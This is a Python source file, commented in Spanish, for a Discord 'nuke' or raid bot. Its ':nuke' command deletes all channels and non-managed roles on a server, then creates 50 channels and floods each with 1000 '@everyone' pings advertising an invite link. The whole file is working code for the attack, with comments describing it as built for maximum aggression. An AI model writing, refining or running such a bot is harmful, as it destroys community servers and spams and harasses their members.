import discord
from discord.ext import commands
import asyncio
import os
import platform  # Importado para la limpieza de consola
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Configuración del bot con todos los privilegios (intents)
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- NUEVA FUNCIÓN DE LIMPIEZA DE CONSOLA ---
def limpiar_consola():
    """Limpia la consola detectando el sistema operativo."""
    # 'nt' es para Windows, 'posix' para Linux/Mac
    command = 'cls' if platform.system() == 'Windows' else 'clear'
    os.system(command)
    print("="*50)
    print("El ciclo de Nuke ha finalizado. Consola limpiada.")
    print(f"Bot conectado como {bot.user.name}")
    print("Esperando el próximo comando :nuke")
    print("="*50)

@bot.event
async def on_ready():
    """Se ejecuta cuando el bot está conectado y listo."""
    # Limpia la consola al iniciar para una vista limpia
    command = 'cls' if platform.system() == 'Windows' else 'clear'
    os.system(command)
    print(f'Bot de Raid Agresivo conectado como {bot.user.name}')
    print('Comando principal: :nuke')

# --- FUNCIÓN DE SPAM MEJORADA ---
async def spam_pings(channel):
    """
    Envía 1000 pings de forma agresiva en un canal.
    El delay se ha reducido para máxima velocidad.
    """
    # El bucle ahora se ejecuta 1000 veces como pediste
    for _ in range(1000):
        try:
            await channel.send("@everyone raid by del1rium https://discord.gg/cJJJWHfnn2")
            # Delay mínimo para un spam muy rápido y agresivo
            await asyncio.sleep(0.1)
        except discord.errors.Forbidden:
            # Si el bot es bloqueado en un canal, simplemente deja de spamear en ese canal
            print(f"Error de permisos en #{channel.name}. Deteniendo spam en este canal.")
            break
        except Exception:
            # Para cualquier otro error, también se detiene en ese canal y sigue con los demás
            break

# --- COMANDO NUKE MEJORADO Y MÁS AGRESIVO ---
@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """
    Comando Ultra-Agresivo:
    1. Borra todos los canales y roles para un impacto máximo.
    2. Crea 50 canales nuevos.
    3. Lanza 1000 pings en CADA UNO de los 50 canales simultáneamente.
    4. Limpia la consola automáticamente al finalizar todo el proceso.
    """
    guild = ctx.guild
    if not guild:
        return

    print(f"INICIANDO NUKE AGRESIVO EN: {guild.name}")

    # 1. Borrado masivo y simultáneo de canales y roles
    print("Fase 1: Borrando todos los canales y roles existentes...")
    roles_a_borrar = [rol for rol in guild.roles if not rol.is_default() and not rol.is_managed()]
    canales_a_borrar = guild.channels
    
    await asyncio.gather(
        *(rol.delete(reason="Nuke") for rol in roles_a_borrar),
        *(canal.delete(reason="Nuke") for canal in canales_a_borrar),
        return_exceptions=True  # Ignora errores si no puede borrar algo
    )
    print("Canales y roles eliminados.")

    # 2. Creación de 50 canales y lanzamiento de spam masivo
    print("Fase 2: Creando 50 canales y lanzando 1000 pings en cada uno...")
    
    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f'raid-by-del1rium-{i+1}')
            print(f"Canal #{channel.name} creado. Iniciando 1000 pings.")
            await spam_pings(channel)
        except Exception:
            # Si la creación de un canal falla, simplemente lo ignora y sigue
            pass

    # Lanza la creación y el spam de los 50 canales de forma concurrente
    spam_tasks = [create_and_spam(i) for i in range(50)]
    await asyncio.gather(*spam_tasks)

    # 3. Limpieza automática de la consola
    print("Todas las tareas de spam han finalizado.")
    limpiar_consola()

@bot.event
async def on_command_error(ctx, error):
    """Maneja errores de permisos de forma silenciosa."""
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("Necesitas permisos de administrador para usar este comando.")
        except:
            pass  # Ignora si no puede enviar el mensaje
    else:
        # Imprime otros errores en la consola pero no detiene el bot
        print(f"Error de comando ignorado: {error}")

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: Configura el DISCORD_TOKEN en tu archivo .env")

